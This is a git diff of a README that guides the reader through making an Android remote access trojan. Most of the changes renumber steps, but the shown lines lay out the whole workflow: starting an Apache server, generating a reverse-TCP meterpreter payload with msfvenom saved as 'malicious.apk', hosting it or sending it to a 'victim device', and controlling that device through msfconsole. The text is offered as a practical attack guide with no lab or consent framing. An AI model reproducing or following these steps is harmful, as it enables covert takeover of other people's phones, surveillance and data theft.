@@ -18,38 +18,39 @@ A Guide for making you own RAT(Remote access tool) for android with the help of 
 
 3. After installing you need to enable and start apache2 server.
    (sudo systemctl start apache2),(sudo systemctl enable apache2)
-![WhatsApp Image 2025-01-02 at 8 22 12 PM](https://github.com/user-attachments/assets/e79ab4ab-95fd-4036-a629-ad5aaf41b1b4)
-![WhatsApp Image 2025-01-02 at 8 23 06 PM](https://github.com/user-attachments/assets/22d2955e-c1dd-4f15-ac2b-5f4b0b65be02)
+   
+  ![WhatsApp Image 2025-01-02 at 8 22 12 PM](https://github.com/user-attachments/assets/e79ab4ab-95fd-4036-a629-ad5aaf41b1b4) 
+  ![WhatsApp Image 2025-01-02 at 8 23 06 PM](https://github.com/user-attachments/assets/22d2955e-c1dd-4f15-ac2b-5f4b0b65be02)
 
-4. Verify that apache2 is running or not.
+5. Verify that apache2 is running or not.
  (sudo systemctl status apache2)
 ![WhatsApp Image 2025-01-02 at 8 24 19 PM](https://github.com/user-attachments/assets/70dfab6d-b595-486b-abda-166a7b2b57af)
 ![WhatsApp Image 2025-01-02 at 8 24 39 PM](https://github.com/user-attachments/assets/559183fa-6e1f-4f59-9840-3e9f85f0ad6d)
 
-5. If you have firewall enable in you system you need to add rule in firewall for apache2.
+6. If you have firewall enable in you system you need to add rule in firewall for apache2.
    (sudo ufw allow 'Apache Full')
 
-6. You wil get you apache2 server folder at (/var/www/html/)
+7. You wil get you apache2 server folder at (/var/www/html/)
 
-7. Now you have successfully created your apache2 server you can vist you index page of you server at
+8. Now you have successfully created your apache2 server you can vist you index page of you server at
    (http//{your-ip}/index.html)
 
-8. Next step is to create payload for you RAT apk.
+9. Next step is to create payload for you RAT apk.
 
-9. We are using msfvenom for creating payload.
+10. We are using msfvenom for creating payload.
     (msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> R > malicious.apk).
    ![Screenshot 2025-01-02 191802](https://github.com/user-attachments/assets/3e9ed813-a821-4079-b78f-e03817f94de2)
 
-10. LHOST: Your IP address (use ifconfig to find it).  
+11. LHOST: Your IP address (use ifconfig to find it).  
      LPORT: A port number for listening (e.g., 4444).  
      malicious.apk: The name of the APK file created.
 ![Screenshot 2025-01-02 191825](https://github.com/user-attachments/assets/26b29ecf-5f1e-451c-83f4-61132521c0ab)
 
-11. After creating apk you can upload it to you server show that anyone with you link can download or you can share apk any way to victim device.
+12. After creating apk you can upload it to you server show that anyone with you link can download or you can share apk any way to victim device.
 
     (mv malicious.apk /var/www/html/) for moving apk to server.
 
-12. Now open msfconsole to monitro the apk and perform task on it on victim device.
+13. Now open msfconsole to monitro the apk and perform task on it on victim device.
 ![Screenshot 2025-01-02 193021](https://github.com/user-attachments/assets/192ce1fd-543d-4fc8-add0-7d01b71a9550)
 ![Screenshot 2025-01-02 193046](https://github.com/user-attachments/assets/d072d315-4dfc-49c9-9d1e-21bdd957e387)
 
